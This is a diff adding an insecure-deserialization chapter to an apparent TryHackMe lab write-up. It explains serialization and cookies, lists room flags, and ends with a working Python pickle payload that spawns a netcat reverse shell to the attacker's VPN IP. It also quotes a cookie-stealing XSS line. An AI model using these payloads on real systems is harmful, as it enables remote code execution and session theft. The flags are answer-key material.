@@ -175,6 +175,133 @@ Payload: `<script>alert(document.cookie)</script>`
 
 Payload: `document.querySelector('#thm-title').textContent = 'I am a hacker'`
 
+## **Day 7 –** Insecure Deserialization
+
+"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" \(Acunetix., 2017\)
+
+This definition is still quite broad, to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS \(Denial of Service\) to RCE \(Remote Code Execution\) that the attacker can use to gain a foothold in a pentesting scenario.
+
+Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications. We'll be explaining this process and why it is so commonplace in modern web applications.
+
+* Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.
+* The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.
+
+#### What's Vulnerable?
+
+At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:
+
+* E-Commerce Sites
+* Forums
+* API's
+* Application Runtimes \(Tomcat, Jenkins, Jboss, etc\)
+
+#### Objects
+
+A prominent element of object-oriented programming \(OOP\), objects are made up of two things:
+
+* State
+* Behaviour
+
+Simply, objects allow you to create similar lines of code without having to do the leg-work of write all lines of code.
+
+For example, a lamp would be a good object. Lamps can have different types of bulbs, this would be their state, as well as being either on/off - their behaviour!
+
+Rather than having to accommodate every type of bulb and whether or not that specific lamp is on or off, you can use methods to simply alter the state and behavior of the lamp.
+
+#### De\(Serialization\)
+
+Serialization is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.
+
+Alternatively, deserialization is the reverse of this; converting serialized information into their complex form - an object that the application will understand.
+
+_Simply, insecure deserialization occurs when data from an untrusted party \(I.e. a hacker\) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred._
+
+#### Cookies 101
+
+Cookies are an essential tool for modern websites to function. Tiny pieces of data, these are created by a website and stored on the user's computer.
+
+Websites use these cookies to store user-specific behaviours like items in their shopping cart or session IDs.
+
+Whilst plaintext credentials is a vulnerability in itself, it is not insecure deserialization as we have not sent any serialized data to be executed!
+
+Cookies are not permanent storage solutions like databases. Some cookies such as session ID's will clear when the browser is closed, others, however, last considerably longer. This is determined by the "Expiry" timer that is set when the cookie is created.
+
+#### Some cookies have additional attributes, a small list of these are below:
+
+| Attribute | Description | Required? |
+| :--- | :--- | :--- |
+| Cookie Name | The Name of the Cookie to be set | Yes |
+| Cookie Value | Value, this can be anything plaintext or encoded  | Yes |
+| Secure Only | If set, this cookie will only be set over HTTPS connections | No  |
+| Expiry | Set a timestamp where the cookie will be removed from the browser | No  |
+| Path | The cookie will only be sent if the specified URL is within the request | No |
+
+Cookies can be set in various website programming languages. For example, Javascript, PHP or Python to name a few. The following web application is developed using Python's Flask, so it is fitting to use it as an example.
+
+![Setting cookies in Flask](.gitbook/assets/capture.png)
+
+Setting cookies in Flask is rather trivial. Simply, this snippet gets the current date and time, stores it within the variable "timestamp" and then stores the date and time in a cookie named "registrationTimestamp". This is what it will look like in the browser.
+
+Cookies Practical
+
+_**\#1st flag \(cookie value\)**_
+
+Look at the cookie then decode base64 cookie then I got the flag
+
+Flag: `THM{good_old_base64_huh}`
+
+_**\#2st flag \(admin dashboard\)**_
+
+Direct to [http://MACHINE\_IP/admin](http://10.10.104.96/admin) to get the flag
+
+Flag: `THM{heres_the_admin_flag}`
+
+#### Remote Code Execution \(RCE\)
+
+_**\#1 flag.txt**_
+
+Just follow the guide in the room -\_-
+
+```text
+root@kali:~# nc -lvnp 4444
+```
+
+```text
+// this is content of rce.py
+import pickle
+import sys
+import base64
+
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
+```
+
+```text
+root@kali:~! python3 rce.py
+```
+
+After run `rce.py` file I've got shell then look for flag.txt in `/home/cmnatic/flag.txt`
+
+Flag: `4a69a7ff9fd68`
+
+
+
+
+
+_\*\*\*\*_
+
+
+
+
+
+
+
 
 
 
